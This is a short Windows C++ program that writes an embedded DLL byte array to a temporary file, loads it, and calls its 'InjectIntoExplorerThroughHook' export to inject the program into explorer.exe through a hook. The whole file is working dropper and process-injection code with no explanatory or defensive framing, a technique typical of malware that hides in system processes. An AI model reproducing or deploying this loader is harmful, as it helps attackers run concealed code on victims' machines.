#include <windows.h>

namespace DllInject
{
	#include "DllInject.h"
}

typedef void(WINAPI *funcInjectIntoExplorerThroughHook)(char*, char*, char*);
typedef void (WINAPI *funcTest)();

int main()
{
	char path[MAX_PATH], name_dll[MAX_PATH];
	char nameExe[MAX_PATH];
	GetModuleFileName(0, nameExe, sizeof(nameExe));
	GetTempPath( MAX_PATH, path );
	GetTempFileName( path, 0, 0, name_dll );
	HANDLE fout = CreateFile( name_dll, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
	DWORD rl;
	WriteFile( fout, DllInject::data, sizeof(DllInject::data), &rl, 0 );
	CloseHandle(fout);
 
	HMODULE hDll = LoadLibrary(name_dll);
	if( hDll == 0 )	return 0;
	funcInjectIntoExplorerThroughHook func = (funcInjectIntoExplorerThroughHook)GetProcAddress( hDll, "InjectIntoExplorerThroughHook" );
	if( func == 0 ) return 0;
	func(nameExe, 0, "RunOtherDll");
	FreeLibrary(hDll);

}
